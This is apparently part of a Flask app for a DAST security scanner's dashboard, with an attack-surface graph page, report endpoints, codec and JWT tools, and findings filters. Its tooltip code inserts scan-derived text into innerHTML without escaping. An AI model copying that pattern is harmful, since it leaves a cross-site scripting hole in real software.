        "nodes":       list(nodes.values()),
        "edges":       edges,
        "stats": {
            "endpoints":    len([n for n in nodes.values() if n["type"] == "endpoint"]),
            "findings":     total_findings,
            "sev_counts":   sev_counts,
            "target":       target_raw,
            "sources": {
                "agent":     len(agent_findings),
                "engine":    len(engine_findings),
                "passive":   len(passive_findings),
                "port":      len(port_findings),
                "ajax_urls": len(ajax_urls),
                "sitemap":   len(sitemap_snap),
            },
        },
    })


@app.route("/graph")
@_login_required
def attack_graph():
    """Serve the interactive DAST attack surface graph page."""
    return Response(_GRAPH_PAGE_HTML, mimetype="text/html")


_GRAPH_PAGE_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>DAST — Attack Surface Graph</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f172a;color:#e2e8f0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;height:100vh;overflow:hidden;display:flex;flex-direction:column}
#topbar{background:#1e293b;border-bottom:1px solid #334155;padding:0.6rem 1.2rem;display:flex;align-items:center;gap:1.2rem;flex-shrink:0;z-index:10}
#topbar h1{font-size:0.95rem;font-weight:700;color:#f1f5f9;letter-spacing:0.04em}
.stat{font-size:0.75rem;color:#94a3b8;display:flex;align-items:center;gap:0.35rem}
.stat strong{color:#f1f5f9}
#controls{display:flex;align-items:center;gap:0.75rem;margin-left:auto}
#controls select,#controls input[type=range]{background:#0f172a;color:#e2e8f0;border:1px solid #334155;border-radius:4px;padding:0.25rem 0.5rem;font-size:0.75rem}
#controls label{font-size:0.75rem;color:#94a3b8}
#controls button{background:#2563eb;color:#fff;border:none;border-radius:4px;padding:0.3rem 0.75rem;font-size:0.75rem;cursor:pointer;font-weight:600}
#controls button:hover{background:#1d4ed8}
#legend{display:flex;align-items:center;gap:0.8rem;margin-left:0.5rem}
.leg{display:flex;align-items:center;gap:0.3rem;font-size:0.7rem;color:#94a3b8}
.leg-dot{width:9px;height:9px;border-radius:50%;flex-shrink:0}
#canvas-wrap{flex:1;position:relative;overflow:hidden}
#graph-canvas{width:100%;height:100%;cursor:grab;display:block}
#graph-canvas:active{cursor:grabbing}
#tooltip{position:absolute;background:#1e293b;border:1px solid #334155;border-radius:6px;padding:0.6rem 0.85rem;font-size:0.76rem;pointer-events:none;display:none;max-width:280px;z-index:20;box-shadow:0 4px 24px rgba(0,0,0,.4)}
#tooltip h3{font-size:0.82rem;margin-bottom:0.35rem;color:#f1f5f9}
#tooltip p{color:#94a3b8;line-height:1.5;margin:0.1rem 0}
#tooltip .sev{display:inline-block;padding:0.1rem 0.4rem;border-radius:999px;font-size:0.66rem;font-weight:700;text-transform:uppercase;margin-bottom:0.25rem}
#empty{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;color:#475569;pointer-events:none}
#empty h2{font-size:1.1rem;margin-bottom:0.5rem}
#empty p{font-size:0.82rem}
.pulse{animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
</style>
</head>
<body>
<div id="topbar">
  <h1>⬡ DAST Attack Surface Graph</h1>
  <div class="stat">Endpoints: <strong id="st-ep">0</strong></div>
  <div class="stat">Findings: <strong id="st-fi">0</strong></div>
  <div class="stat" id="sev-stats"></div>
  <div id="legend">
    <div class="leg"><div class="leg-dot" style="background:#0f172a;border:2px solid #64748b"></div>Host</div>
    <div class="leg"><div class="leg-dot" style="background:#64748b"></div>Path</div>
    <div class="leg"><div class="leg-dot" style="background:#94a3b8"></div>Endpoint</div>
    <div class="leg"><div class="leg-dot" style="background:#dc2626"></div>Critical</div>
    <div class="leg"><div class="leg-dot" style="background:#ea580c"></div>High</div>
    <div class="leg"><div class="leg-dot" style="background:#2563eb"></div>Medium</div>
    <div class="leg"><div class="leg-dot" style="background:#16a34a"></div>Low</div>
  </div>
  <div id="controls">
    <label>Min severity:
      <select id="sev-filter">
        <option value="info">All</option>
        <option value="low">Low+</option>
        <option value="medium">Medium+</option>
        <option value="high">High+</option>
        <option value="critical">Critical only</option>
      </select>
    </label>
    <label><input type="checkbox" id="clean-toggle" checked> Show clean endpoints</label>
    <button id="refresh-btn">↻ Refresh</button>
    <button id="reset-btn">⊙ Reset view</button>
  </div>
</div>
<div id="canvas-wrap">
  <canvas id="graph-canvas"></canvas>
  <div id="tooltip"></div>
  <div id="empty"><h2 class="pulse">No scan data yet</h2><p>Launch a scan to populate the attack surface graph.</p></div>
</div>
<script>
// ── Config ──────────────────────────────────────────────────────────────────
const POLL_MS   = 4000;
const ITER      = 300;
const K_REPEL   = 18000;
const K_SPRING  = 0.04;
const K_DAMP    = 0.78;
const K_GRAVITY = 0.006;

// ── State ────────────────────────────────────────────────────────────────────
let nodes = [], edges = [], sim = null;
let camX = 0, camY = 0, zoom = 1;
let dragging = null, dragOffX = 0, dragOffY = 0;
let mouseX = -9999, mouseY = -9999;
let hoveredNode = null;
let pinned = {};           // pinned by user drag
let polling = null;

const canvas  = document.getElementById('graph-canvas');
const ctx     = canvas.getContext('2d');
const tooltip = document.getElementById('tooltip');
const empty   = document.getElementById('empty');

// ── Resize ───────────────────────────────────────────────────────────────────
function resize() {
  const wrap = document.getElementById('canvas-wrap');
  canvas.width  = wrap.clientWidth;
  canvas.height = wrap.clientHeight;
  draw();
}
window.addEventListener('resize', resize);

// ── Data fetch ───────────────────────────────────────────────────────────────
async function fetchGraph() {
  const sev   = document.getElementById('sev-filter').value;
  const clean = document.getElementById('clean-toggle').checked ? '1' : '0';
  try {
    const r = await fetch(`/api/graph-data?min_severity=${sev}&include_clean=${clean}`);
    if (!r.ok) return;
    const data = await r.json();
    updateGraph(data);
  } catch(e) { /* server not ready */ }
}

function updateGraph(data) {
  const stats = data.stats || {};
  document.getElementById('st-ep').textContent = stats.endpoints || 0;
  document.getElementById('st-fi').textContent = stats.findings  || 0;

  const SC = {critical:'#dc2626',high:'#ea580c',medium:'#2563eb',low:'#16a34a',info:'#6366f1'};
  const sevc = stats.sev_counts || {};
  document.getElementById('sev-stats').innerHTML = Object.entries(sevc)
    .filter(([,v]) => v > 0)
    .map(([k,v]) => `<span style="color:${SC[k]||'#94a3b8'};font-weight:700">${v} ${k}</span>`)
    .join('&nbsp;·&nbsp;');

  empty.style.display = data.nodes.length <= 1 ? 'block' : 'none';

  // Preserve positions for existing nodes
  const oldPos = {};
  for (const n of nodes) oldPos[n.id] = {x: n.x, y: n.y, vx: n.vx, vy: n.vy, pinned: n.pinned};

  const W = canvas.width, H = canvas.height;
  nodes = data.nodes.map(n => {
    const old = oldPos[n.id];
    return {
      ...n,
      x:      old ? old.x  : W/2 + (Math.random()-.5)*200,
      y:      old ? old.y  : H/2 + (Math.random()-.5)*200,
      vx:     old ? old.vx : 0,
      vy:     old ? old.vy : 0,
      pinned: old ? old.pinned : false,
    };
  });
  edges = data.edges;

  if (!sim) startSim();
  else resetSim(ITER/3);
}

// ── Force simulation ──────────────────────────────────────────────────────────
let simIter = 0;
function startSim() {
  simIter = ITER;
  sim = requestAnimationFrame(tick);
}
function resetSim(iters) { simIter = Math.max(simIter, iters|0); }

function tick() {
  const W = canvas.width, H = canvas.height;
  const cx = W/2 + camX, cy = H/2 + camY;

  if (simIter > 0 || nodes.length < 200) {
    simIter = Math.max(0, simIter - 1);
    // Build adjacency for spring forces
    const idxOf = {};
    nodes.forEach((n,i) => idxOf[n.id] = i);

    // Repulsion
    for (let i = 0; i < nodes.length; i++) {
      for (let j = i+1; j < nodes.length; j++) {
        const a = nodes[i], b = nodes[j];
        const dx = b.x - a.x, dy = b.y - a.y;
        const dist2 = Math.max(dx*dx + dy*dy, 1);
        const dist  = Math.sqrt(dist2);
        const f = K_REPEL / dist2;
        const fx = f * dx/dist, fy = f * dy/dist;
        if (!a.pinned) { a.vx -= fx; a.vy -= fy; }
        if (!b.pinned) { b.vx += fx; b.vy += fy; }
      }
    }

    // Spring (edges)
    const typeDist = {contains: 120, vulnerable_to: 80};
    for (const e of edges) {
      const a = nodes[idxOf[e.source]], b = nodes[idxOf[e.target]];
      if (!a || !b) continue;
      const dx = b.x - a.x, dy = b.y - a.y;
      const dist = Math.sqrt(dx*dx + dy*dy) || 1;
      const rest = typeDist[e.type] || 100;
      const f = K_SPRING * (dist - rest);
      const fx = f * dx/dist, fy = f * dy/dist;
      if (!a.pinned) { a.vx += fx; a.vy += fy; }
      if (!b.pinned) { b.vx -= fx; b.vy -= fy; }
    }

    // Gravity toward center
    for (const n of nodes) {
      if (n.pinned) continue;
      n.vx += K_GRAVITY * (cx - n.x);
      n.vy += K_GRAVITY * (cy - n.y);
      n.vx *= K_DAMP;
      n.vy *= K_DAMP;
      n.x  += n.vx;
      n.y  += n.vy;
    }
  }

  draw();
  sim = requestAnimationFrame(tick);
}

// ── Draw ──────────────────────────────────────────────────────────────────────
const SEV_GLOW = {critical:'rgba(220,38,38,.35)',high:'rgba(234,88,12,.3)',
                   medium:'rgba(37,99,235,.25)',low:'rgba(22,163,74,.25)'};

function draw() {
  const W = canvas.width, H = canvas.height;
  ctx.clearRect(0,0,W,H);

  if (!nodes.length) return;

  // Build lookup
  const lookup = {};
  for (const n of nodes) lookup[n.id] = n;

  // Edges
  ctx.save();
  for (const e of edges) {
    const a = lookup[e.source], b = lookup[e.target];
    if (!a || !b) continue;
    const ax = a.x*zoom + W/2 + camX - W/2*zoom,
          ay = a.y*zoom + H/2 + camY - H/2*zoom,
          bx = b.x*zoom + W/2 + camX - W/2*zoom,
          by = b.y*zoom + H/2 + camY - H/2*zoom;
    ctx.beginPath();
    ctx.moveTo(ax, ay);
    ctx.lineTo(bx, by);
    ctx.strokeStyle = e.type === 'vulnerable_to'
      ? (e.color || '#ef4444') + '88'
      : '#334155';
    ctx.lineWidth = e.type === 'vulnerable_to' ? 1.5 : 0.8;
    if (e.type === 'vulnerable_to') {
      ctx.setLineDash([4,3]);
    } else {
      ctx.setLineDash([]);
    }
    ctx.stroke();
  }
  ctx.setLineDash([]);
  ctx.restore();

  // Nodes
  for (const n of nodes) {
    const nx = n.x*zoom + W/2 + camX - W/2*zoom;
    const ny = n.y*zoom + H/2 + camY - H/2*zoom;
    const r  = (n.size || 10) * zoom;
    const hov = hoveredNode === n.id;

    // Glow for finding nodes
    if (n.type === 'finding' && SEV_GLOW[n.detail?.severity]) {
      ctx.save();
      ctx.shadowColor  = SEV_GLOW[n.detail.severity];
      ctx.shadowBlur   = 14 * zoom;
      ctx.beginPath();
      ctx.arc(nx, ny, r, 0, Math.PI*2);
      ctx.fillStyle = n.color || '#6366f1';
      ctx.fill();
      ctx.restore();
    } else if (hov) {
      ctx.save();
      ctx.shadowColor = n.color + '88';
      ctx.shadowBlur  = 18 * zoom;
      ctx.beginPath();
      ctx.arc(nx, ny, r + 2*zoom, 0, Math.PI*2);
      ctx.fillStyle = n.color || '#64748b';
      ctx.fill();
      ctx.restore();
    }

    // Main circle
    ctx.beginPath();
    ctx.arc(nx, ny, r, 0, Math.PI*2);
    if (n.type === 'host') {
      ctx.fillStyle = '#1e293b';
      ctx.fill();
      ctx.strokeStyle = '#60a5fa';
      ctx.lineWidth = 2.5 * zoom;
      ctx.stroke();
    } else {
      ctx.fillStyle = n.color || '#64748b';
      ctx.fill();
    }

    // Pin indicator
    if (n.pinned) {
      ctx.beginPath();
      ctx.arc(nx + r*0.6, ny - r*0.6, 3*zoom, 0, Math.PI*2);
      ctx.fillStyle = '#fbbf24';
      ctx.fill();
    }

    // Labels — only for large enough nodes or when hovered
    if ((r > 8 || hov) && n.label) {
      const fs = Math.max(9, Math.min(13, r * 0.9));
      ctx.font = `${fs}px sans-serif`;
      ctx.fillStyle = n.type === 'host' ? '#60a5fa' : '#f1f5f9';
      ctx.textAlign  = 'center';
      ctx.textBaseline = 'middle';
      const lbl = n.label.length > 18 ? n.label.slice(0,17)+'…' : n.label;
      if (n.type === 'finding') {
        ctx.fillText(lbl, nx, ny + r + fs*0.8);
      } else {
        ctx.fillText(lbl, nx, ny + r + fs*0.8);
      }
    }
  }
}

// ── Hover & tooltip ──────────────────────────────────────────────────────────
function worldPos(ex, ey) {
  const W = canvas.width, H = canvas.height;
  return {
    wx: (ex - W/2 - camX + W/2*zoom) / zoom,
    wy: (ey - H/2 - camY + H/2*zoom) / zoom,
  };
}

function hitTest(ex, ey) {
  const {wx, wy} = worldPos(ex, ey);
  for (let i = nodes.length-1; i >= 0; i--) {
    const n = nodes[i];
    const dx = wx - n.x, dy = wy - n.y;
    if (dx*dx + dy*dy <= (n.size||10)*(n.size||10)*1.3) return n;
  }
  return null;
}

function showTooltip(n, ex, ey) {
  const d = n.detail || {};
  const SC = {critical:'#dc2626',high:'#ea580c',medium:'#2563eb',low:'#16a34a',info:'#6366f1',info2:'#94a3b8'};
  let html = `<h3>${n.label}</h3>`;
  if (n.type === 'finding') {
    html += `<div class="sev" style="background:${SC[d.severity]||'#64748b'}22;color:${SC[d.severity]||'#94a3b8'}">${d.severity||'info'}</div><br>`;
    if (d.vuln_type) html += `<p><b>Type:</b> ${d.vuln_type}</p>`;
    if (d.url)       html += `<p><b>URL:</b> ${d.url.slice(0,60)}${d.url.length>60?'…':''}</p>`;
    if (d.param)     html += `<p><b>Param:</b> ${d.param}</p>`;
    if (d.cwe)       html += `<p><b>CWE:</b> ${d.cwe}</p>`;
    if (d.finding)   html += `<p style="margin-top:.35rem;color:#cbd5e1">${d.finding.slice(0,120)}${d.finding.length>120?'…':''}</p>`;
  } else if (n.type === 'endpoint') {
    if (d.url)      html += `<p>${d.url.slice(0,70)}${d.url.length>70?'…':''}</p>`;
    if (d.status)   html += `<p><b>Status:</b> ${d.status}</p>`;
    html += `<p><b>Findings:</b> ${d.findings||0}</p>`;
    if (d.findings) html += `<p style="color:${SC[n.worst_severity]||'#94a3b8'}"><b>Worst:</b> ${n.worst_severity}</p>`;
  } else if (n.type === 'host') {
    html += `<p>${d.url||n.label}</p>`;
  } else {
    if (d.path) html += `<p>${d.path}</p>`;
  }
  tooltip.innerHTML = html;
  tooltip.style.display = 'block';

  const wrap = document.getElementById('canvas-wrap');
  const wW = wrap.clientWidth, wH = wrap.clientHeight;
  let tx = ex + 14, ty = ey - 10;
  if (tx + 290 > wW) tx = ex - 300;
  if (ty + 160 > wH) ty = ey - 150;
  tooltip.style.left = Math.max(4, tx) + 'px';
  tooltip.style.top  = Math.max(4, ty) + 'px';
}

// ── Input handlers ───────────────────────────────────────────────────────────
canvas.addEventListener('mousemove', e => {
  const {left, top} = canvas.getBoundingClientRect();
  const ex = e.clientX - left, ey = e.clientY - top;
  mouseX = ex; mouseY = ey;

  if (dragging) {
    const {wx, wy} = worldPos(ex, ey);
    dragging.x = wx + dragOffX;
    dragging.y = wy + dragOffY;
    dragging.vx = 0; dragging.vy = 0;
    dragging.pinned = true;
    resetSim(20);
    return;
  }

  const n = hitTest(ex, ey);
  if (n) {
    hoveredNode = n.id;
    canvas.style.cursor = 'pointer';
    showTooltip(n, ex, ey);
  } else {
    hoveredNode = null;
    canvas.style.cursor = 'grab';
    tooltip.style.display = 'none';
  }
});

canvas.addEventListener('mousedown', e => {
  const {left, top} = canvas.getBoundingClientRect();
  const ex = e.clientX - left, ey = e.clientY - top;
  const n = hitTest(ex, ey);
  if (n) {
    const {wx, wy} = worldPos(ex, ey);
    dragOffX = n.x - wx;
    dragOffY = n.y - wy;
    dragging = n;
    canvas.style.cursor = 'grabbing';
  }
});

canvas.addEventListener('mouseup', () => { dragging = null; canvas.style.cursor = 'grab'; });
canvas.addEventListener('mouseleave', () => { dragging = null; tooltip.style.display = 'none'; hoveredNode = null; });

// Pan
let panStart = null;
canvas.addEventListener('mousedown', e => {
  if (dragging) return;
  panStart = {x: e.clientX - camX, y: e.clientY - camY};
});
window.addEventListener('mousemove', e => {
  if (!panStart || dragging) return;
  camX = e.clientX - panStart.x;
  camY = e.clientY - panStart.y;
});
window.addEventListener('mouseup', () => { panStart = null; });

// Zoom
canvas.addEventListener('wheel', e => {
  e.preventDefault();
  const factor = e.deltaY < 0 ? 1.1 : 0.9;
  zoom = Math.min(4, Math.max(0.2, zoom * factor));
  resetSim(20);
}, {passive:false});

// Buttons
document.getElementById('refresh-btn').addEventListener('click', fetchGraph);
document.getElementById('reset-btn').addEventListener('click', () => {
  camX = 0; camY = 0; zoom = 1;
  for (const n of nodes) { n.pinned = false; }
  resetSim(ITER);
});
document.getElementById('sev-filter').addEventListener('change', fetchGraph);
document.getElementById('clean-toggle').addEventListener('change', fetchGraph);

// ── Bootstrap ────────────────────────────────────────────────────────────────
resize();
fetchGraph();
polling = setInterval(fetchGraph, POLL_MS);
startSim();
</script>
</body>
</html>"""


@app.route("/api/report/html")
@_login_required
def get_html_report():
    """Generate and download a standalone HTML security report."""
    import tempfile, os as _os
    with _lock:
        findings_snap = list(_findings)
    if not findings_snap:
        return jsonify({"error": "No findings yet — run a scan first"}), 404
    try:
        report = HtmlReport()
        with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w") as _tf:
            _tmp_path = _tf.name
        report.generate(findings_snap, target=_scan_target or "unknown", output_path=_tmp_path)
        with open(_tmp_path, "r", encoding="utf-8") as _f:
            html_content = _f.read()
        _os.unlink(_tmp_path)
        from flask import Response as _Resp
        return _Resp(
            html_content,
            mimetype="text/html",
            headers={"Content-Disposition": "attachment; filename=dast-report.html"},
        )
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/report/root-causes")
@_login_required
def get_root_causes():
    """Return root cause analysis from the last scan's FindingCorrelator run."""
    data = _db_get_kv("root_causes") or []
    return jsonify({"root_causes": data, "count": len(data)})


@app.route("/api/report/systemic-issues")
@_login_required
def get_systemic_issues():
    """Return systemic issues (3+ findings with same root cause) from last scan."""
    data = _db_get_kv("systemic_issues") or []
    return jsonify({"systemic_issues": data, "count": len(data)})


# ─── Codec / Encoder-Decoder Tools ──────────────────────────────────────────

@app.route("/api/tools/codec/decode", methods=["POST"])
@_login_required
def api_codec_decode():
    """Auto-detect encoding and decode value. Body: {"data": "..."}"""
    if not _HAS_CODEC:
        return jsonify({"error": "codec module not available"}), 503
    body = request.get_json(silent=True) or {}
    data = body.get("data", "")
    if not data:
        return jsonify({"error": "data field required"}), 400
    try:
        result = _codec_decode_auto(data)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/tools/codec/encode", methods=["POST"])
@_login_required
def api_codec_encode():
    """Encode value in specified format. Body: {"data": "...", "format": "base64|url|html|hex|gzip|unicode"}"""
    if not _HAS_CODEC:
        return jsonify({"error": "codec module not available"}), 503
    body = request.get_json(silent=True) or {}
    data = body.get("data", "")
    fmt  = body.get("format", "")
    if not data or not fmt:
        return jsonify({"error": "data and format fields required"}), 400
    try:
        encoded = _codec_encode(data, fmt)
        return jsonify({"encoded": encoded, "format": fmt})
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/tools/codec/detect", methods=["POST"])
@_login_required
def api_codec_detect():
    """Detect encoding format without decoding. Body: {"data": "..."}"""
    if not _HAS_CODEC:
        return jsonify({"error": "codec module not available"}), 503
    body = request.get_json(silent=True) or {}
    data = body.get("data", "")
    if not data:
        return jsonify({"error": "data field required"}), 400
    try:
        result = _codec_decode_auto(data)
        return jsonify({"detected": result["detected"], "format": result["format"]})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/tools/codec/jwt/analyze", methods=["POST"])
@_login_required
def api_codec_jwt_analyze():
    """Full JWT decode and security analysis. Body: {"token": "..."}"""
    if not _HAS_CODEC:
        return jsonify({"error": "codec module not available"}), 503
    body = request.get_json(silent=True) or {}
    token = body.get("token", "")
    if not token:
        return jsonify({"error": "token field required"}), 400
    try:
        result = _codec_jwt_analyze(token)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/tools/codec/chain", methods=["POST"])
@_login_required
def api_codec_chain():
    """Apply chained transforms. Body: {"data": "...", "transforms": ["base64", "url"], "decode": false}"""
    if not _HAS_CODEC:
        return jsonify({"error": "codec module not available"}), 503
    body = request.get_json(silent=True) or {}
    data       = body.get("data", "")
    transforms = body.get("transforms", [])
    decode_mode = body.get("decode", False)
    if not data or not transforms:
        return jsonify({"error": "data and transforms fields required"}), 400
    try:
        chain = _CodecChain(transforms)
        if decode_mode:
            result = chain.decode_chain(data)
        else:
            result = chain.apply(data)
        return jsonify({"result": result, "transforms": transforms, "mode": "decode" if decode_mode else "encode"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ─── Auth: Macro Re-Auth ─────────────────────────────────────────────────────

@app.route("/api/engine/auth/macro", methods=["GET", "POST", "DELETE"])
@_login_required
def api_engine_auth_macro():
    """GET: return current macro. POST: set macro script JSON. DELETE: clear macro."""
    global _engine_macro_script
    import json as _json, tempfile as _tmp, os as _os2

    if request.method == "GET":
        if _engine_macro_script and _os2.path.exists(_engine_macro_script):
            with open(_engine_macro_script) as f:
                return jsonify({"script": _json.load(f), "path": _engine_macro_script})
        return jsonify({"script": None})

    elif request.method == "DELETE":
        _engine_macro_script = None
        return jsonify({"cleared": True})

    # POST — save macro JSON to temp file
    body = request.get_json(silent=True) or {}
    script = body.get("script")
    if not script:
        return jsonify({"error": "script field required"}), 400
    try:
        path = _os2.path.expanduser("~/.dast_macro_reauth.json")
        with open(path, "w") as f:
            _json.dump(script, f, indent=2)
        _engine_macro_script = path
        return jsonify({"saved": True, "path": path, "steps": len(script.get("steps", []))})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/engine/auth/cookie-rules", methods=["GET", "POST"])
@_login_required
def api_engine_auth_cookie_rules():
    """GET: return current cookie rules. POST: set rules list."""
    global _engine_cookie_rules

    if request.method == "GET":
        return jsonify({"rules": _engine_cookie_rules, "count": len(_engine_cookie_rules)})

    body = request.get_json(silent=True) or {}
    rules = body.get("rules")
    if not isinstance(rules, list):
        return jsonify({"error": "rules must be a list"}), 400
    _engine_cookie_rules = rules
    return jsonify({"saved": True, "count": len(rules)})


# ── Findings filter helper ────────────────────────────────────────────────────

_CONFIDENCE_RANK = {"certain": 3, "firm": 2, "tentative": 1}


def _apply_findings_filter(findings: list, filters: dict) -> list:
    """Apply server-side filter params to a list of finding dicts.

    Handles both ScanFinding.to_dict() format (vuln_type, url) and raw engine
    finding dicts (type, target). Unrecognised filters are silently ignored.
    No-op when *filters* is empty or all values are falsy.

    Supported filters (all optional, all case-insensitive where applicable):
      severity      — exact match (critical/high/medium/low/info)
      vuln_type     — substring match
      url_contains  — substring match on url/target
      param         — substring match
      agent         — substring match on agent_id
      min_confidence — CERTAIN > FIRM > TENTATIVE threshold
      status_code   — integer equality on HTTP status
      mime_type     — substring match on content_type/mime_type field
      in_scope      — "true"/"false" to filter by scope flag
      annotation    — substring match on notes/annotation field
      search        — substring match across url, finding, vuln_type, param (full-text)
    """
    severity     = (filters.get("severity") or "").strip().lower()
    vuln_type    = (filters.get("vuln_type") or "").strip().lower()
    url_contains = (filters.get("url_contains") or "").strip().lower()
    param        = (filters.get("param") or "").strip().lower()
    agent        = (filters.get("agent") or "").strip().lower()
    min_conf_raw = (filters.get("min_confidence") or "").strip().lower()
    status_code  = filters.get("status_code")
    mime_type    = (filters.get("mime_type") or "").strip().lower()
    in_scope_raw = (filters.get("in_scope") or "").strip().lower()
    annotation   = (filters.get("annotation") or "").strip().lower()
    search       = (filters.get("search") or "").strip().lower()

    try:
        status_code = int(status_code) if status_code is not None and str(status_code).strip() else None
    except (ValueError, TypeError):
        status_code = None

    in_scope: bool | None = None
    if in_scope_raw == "true":
        in_scope = True
    elif in_scope_raw == "false":
        in_scope = False

    min_conf_rank = _CONFIDENCE_RANK.get(min_conf_raw, 0) if min_conf_raw else 0

    if not any([severity, vuln_type, url_contains, param, agent, min_conf_rank,
                status_code, mime_type, in_scope is not None, annotation, search]):
        return findings

    out = []
    for f in findings:
        # severity — case-insensitive equal match
        if severity and (f.get("severity") or "").lower() != severity:
            continue
        # vuln_type — substring in vuln_type OR type field
        if vuln_type:
            fvt = (f.get("vuln_type") or f.get("type") or "").lower()
            if vuln_type not in fvt:
                continue
        # status_code — integer equality
        if status_code is not None and f.get("status_code") != status_code:
            continue
        # url_contains — substring in url OR target
        if url_contains:
            furl = (f.get("url") or f.get("target") or "").lower()
            if url_contains not in furl:
                continue
        # param — substring match
        if param and param not in (f.get("param") or "").lower():
            continue
        # agent — substring match
        if agent and agent not in (f.get("agent") or "").lower():
            continue
        # min_confidence — exclude below threshold
        if min_conf_rank:
            fconf = (f.get("confidence_level") or "tentative").lower()
            if _CONFIDENCE_RANK.get(fconf, 1) < min_conf_rank:
                continue
        # mime_type — substring match on content_type or mime_type field
        if mime_type:
            fmime = (f.get("content_type") or f.get("mime_type") or "").lower()
            if mime_type not in fmime:
                continue
        # in_scope — boolean equality on scope flag
        if in_scope is not None:
            fscope = bool(f.get("in_scope", True))  # default to in-scope if unset
            if fscope != in_scope:
                continue
        # annotation — substring match on notes/annotation
        if annotation:
            fanno = (f.get("annotation") or f.get("notes") or "").lower()
            if annotation not in fanno:
                continue
        # search — full-text substring across key fields
        if search:
            haystack = " ".join([
                (f.get("url") or f.get("target") or ""),
                (f.get("vuln_type") or f.get("type") or ""),
                (f.get("finding") or ""),
                (f.get("param") or ""),
                (f.get("severity") or ""),
            ]).lower()
            if search not in haystack:
                continue
        out.append(f)
    return out


def _normalize_passive_finding(pf: dict) -> dict:
    """Reshape a PassiveFinding dict to match the standard finding format."""
    return {
        "agent":            "Passive Scanner",
        "agent_id":         "passive_scanner",
        "icon":             "🛡️",
        "phase":            "Passive",
        "finding":          pf.get("finding", ""),
        "severity":         pf.get("severity", "Low"),
        "type":             pf.get("category", "passive"),
        "category":         pf.get("category", "passive"),
        "url":              pf.get("url", ""),
        "target":           pf.get("url", ""),
        "proof":            pf.get("evidence", ""),
        "remediation":      pf.get("remediation", ""),
        "cwe":              pf.get("cwe", ""),
        "owasp":            pf.get("owasp", ""),
        "param":            pf.get("param", ""),
        "payload":          "",
        "evidence_id":      None,
        "status_code":      pf.get("status_code", 0),
        "method":           pf.get("method", "GET"),
        "request_headers":  pf.get("request_headers", {}),
        "response_headers": pf.get("response_headers", {}),
        "resp_body":        pf.get("resp_body", ""),
    }


def _group_findings(out: list) -> dict:
    """Group a flat findings list by (type, finding_text). Returns jsonify-ready dict."""
    SEV_RANK = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    groups: dict = {}
    for f in out:
        key = (f.get("type") or f.get("vuln_type") or f.get("category") or "unknown",
               (f.get("finding") or "").strip())
        if key not in groups:
            groups[key] = {
                "agent":        f.get("agent", ""),
                "icon":         f.get("icon", "🔍"),
                "severity":     f.get("severity", "medium"),
                "type":         key[0],
                "finding":      key[1],
                "category":     f.get("category", key[0]),
                "affected_urls": [],
                "count":        0,
                "phase":        f.get("phase", ""),
                "proof":        f.get("proof", ""),
                "proof_data":   f.get("proof_data", ""),
                "remediation":  f.get("remediation", ""),
                "owasp":        f.get("owasp", ""),
                "cwe":          f.get("cwe", ""),
                "cvss_score":   f.get("cvss_score"),
                "param":        f.get("param", ""),
                "payload":      f.get("payload", ""),
                "evidence_id":  f.get("evidence_id"),
                "status_code":  f.get("status_code", 0),
                "status":       f.get("status", "open"),
                "url":          f.get("url") or f.get("target") or "",
                "instances":    [],
            }
        g = groups[key]
        g["count"] += 1
        url = f.get("url") or f.get("target") or ""
        if url and url not in g["affected_urls"]:
            g["affected_urls"].append(url)
        if url and len(g["instances"]) < 5:
            g["instances"].append({
                "url":              url,
                "method":           f.get("method", "GET"),
                "status_code":      f.get("status_code", 0),
                "request_headers":  f.get("request_headers") or {},
                "response_headers": f.get("response_headers") or {},
                "payload":          f.get("payload", ""),
                "param":            f.get("param", ""),
                "evidence_id":      f.get("evidence_id"),
                "proof":            f.get("proof", "") or f.get("evidence", ""),
            })
        fsev = (f.get("severity") or "medium").lower()
        gsev = (g["severity"] or "medium").lower()
        if SEV_RANK.get(fsev, 2) < SEV_RANK.get(gsev, 2):
            g["severity"] = f.get("severity")
    grouped_list = sorted(groups.values(),
                          key=lambda g: SEV_RANK.get((g["severity"] or "medium").lower(), 2))
    return {"findings": grouped_list, "count": len(grouped_list), "total_raw": len(out)}


@app.route("/api/findings")
@_login_required
def findings():
    phase = req.args.get("phase")
    grouped = req.args.get("grouped", "1")  # default to grouped
    with _lock:
        # Exclude discovery-only paths from main findings; they have path counters.
        engine_out = [f for f in _main_security_findings(_findings)
                      if not phase or f.get("phase") == phase]
        # Normalize and merge passive findings
        passive_out = [_normalize_passive_finding(pf) for pf in _passive_findings
                       if not phase or phase == "Passive"]
        out = engine_out + passive_out

    out = _apply_findings_filter(out, {
        "severity":      req.args.get("severity"),
        "vuln_type":     req.args.get("vuln_type"),
        "status_code":   req.args.get("status_code"),
        "url_contains":  req.args.get("url_contains"),
        "param":         req.args.get("param"),
        "agent":         req.args.get("agent"),
        "min_confidence": req.args.get("min_confidence"),
    })

    if grouped == "0":
        return jsonify({"findings": out, "count": len(out)})

    return jsonify(_group_findings(out))


@app.route("/api/findings/by-endpoint")
@_login_required
def findings_by_endpoint():
    """Group findings by URL — shows all issues found on each endpoint."""
    phase = req.args.get("phase")
    with _lock:
        engine_out = [f for f in _main_security_findings(_findings)
                      if not phase or f.get("phase") == phase]
        passive_out = [_normalize_passive_finding(pf) for pf in _passive_findings
                       if not phase or phase == "Passive"]
        out = engine_out + passive_out

    SEV_RANK = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    endpoints: dict = {}
    for f in out:
        url = f.get("url") or f.get("target") or "unknown"
        if url not in endpoints:
